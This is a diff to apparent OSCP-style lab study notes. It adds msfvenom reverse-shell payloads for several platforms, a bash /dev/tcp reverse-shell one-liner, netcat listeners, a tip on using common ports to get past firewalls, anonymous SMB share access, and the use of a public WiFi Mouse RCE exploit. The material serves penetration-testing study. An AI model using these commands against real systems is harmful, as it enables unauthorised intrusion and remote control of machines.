@@ -61,10 +61,26 @@
     - Linux: `find / -name "flag.txt" 2>/dev/null`  (cat flag.txt)  
     - Windows: C:\Windows\system32> `where /r C:\ flag.txt`  (type flag.txt)  
     - Windows: PS C:\Windows\System32\WindowsPowerShell\v1.0> `gci C:\ -Filter flag.txt -Recurse -ea SilentlyContinue` (type flag.txt)  
-  - webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
+  - ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
     - aspx: cmdasp.aspx
     - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
     - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+  - generate reverse shell payload  
+    **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
+    **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
+    **step 3 generate payload based on target platform**  
+    - windows32: 'msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe'  
+    - windows64: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe'  
+    - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
+    - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
+    - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
+    - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`  
+    - Bash RCE, command injection: `bash -i >& /dev/tcp/<KALI>/4444 0>&1`
+      
+    **Tips:**  
+    - Always match LPORT between payload and nc  
+    - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
+    - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls  
   - Kali port:
     - 4444 (reverse shell)
     - 8080 (burp suite)
@@ -75,11 +91,11 @@
 	| Port | Protocol | Service              | Description / Use Case                                  |
 	|------|----------|----------------------|----------------------------------------------------------|
 	| 21   | TCP      | FTP                  | Anonymous login, misconfig, potential file upload        |
-	| 22   | TCP      | SSH                  | Weak passwords, key reuse, outdated versions             |
+	| *22   | TCP      | SSH                  | Weak passwords, key reuse, outdated versions             |
 	| 23   | TCP      | Telnet               | Plain-text credentials, banner info                      |
 	| 25   | TCP      | SMTP                 | User enum, phishing, open relay                          |
 	| 53   | TCP/UDP  | DNS                  | Zone transfers, DNS enumeration                          |
-	| 80   | TCP      | HTTP                 | Web apps (SQLi, LFI/RFI), Gobuster, Nikto                |
+	| *80   | TCP      | HTTP                 | Web apps (SQLi, LFI/RFI), Gobuster, Nikto                |
 	| 88   | TCP      | Kerberos             | AS-REP roasting, Kerberoasting (Active Directory)        |
 	| 110  | TCP      | POP3                 | Cleartext creds, vulnerable auth                         |
 	| 111  | TCP/UDP  | RPCBind              | NFS, remote procedure enumeration                        |
@@ -88,7 +104,7 @@
 	| 143  | TCP      | IMAP                 | Cleartext creds, mailbox enum                            |
 	| 161  | UDP      | SNMP                 | Public community strings, SNMPwalk                       |
 	| 389  | TCP/UDP  | LDAP                 | AD enum, user/group info                                 |
-	| 445  | TCP      | SMB                  | EternalBlue, shares, null sessions, LPE                 |
+	| *445  | TCP      | SMB                  | EternalBlue, shares, null sessions, LPE                 |
 	| 512  | TCP      | RSH                  | Remote shell, legacy service                             |
 	| 513  | TCP      | RLogin               | Legacy login service                                     |
 	| 587  | TCP      | SMTP (Submission)    | Authenticated email sending                              |
@@ -114,6 +130,14 @@
       On RDP Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
       ```  
     - Linux <> Kali
+    - SMB (port 445)
+      - `smbclient -L \\\\192.168.171.10`: List available SMB shares on the target
+      - `smbclient \\\\192.168.171.10\\Users -N`: Connect to the Users share anonymously`
+        ```
+        smb: \> ls
+	smb: \offsec\Downloads\> ls
+	smb: \offsec\Downloads\> get flag.txt
+        ```
   - Selecting [exploit](https://www.exploit-db.com/) rules
     - Priority
       - match service + version, unauthenticated exploit, RCE, exploit in python/bash, exploit with shellcode/reversell, exploit available in 'searchsploit'
@@ -1273,6 +1297,23 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - Start netcat listener: `nc -lvnp 443`
   - Exploit `python2 easychat_50999.py 192.168.171.213 20000`
   - type C:\Users\Administrator\Desktop\flag.txt
+
+### Locating public exploits   
+- mouse server - WiFi Mouse 1.7.8.5 - Remote Code Execution
+  - connect to SMB download folders to get hints
+    ```
+    smbclient \\\\192.168.171.10\\Users -N : Connect to the Users share anonymously
+    smb: \offsec\Downloads\> ls
+    MouseServer.exe 
+    ```
+  - searchsploit "mouse server" [50972.py](https://www.exploit-db.com/exploits/50972)
+  - generate windows reverse shell payload
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o shell32.exe`
+    - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o shell64.exe`
+  - `python3 -m http.server 80`
+  - `nc -lvnp 443`
+  - `python3 mouseserver_50972.py 192.168.171.10 192.168.45.165 shell64.exe`  
+- 
 
 ### Password Attacks  
 - 16.1.1 SSH and RDP
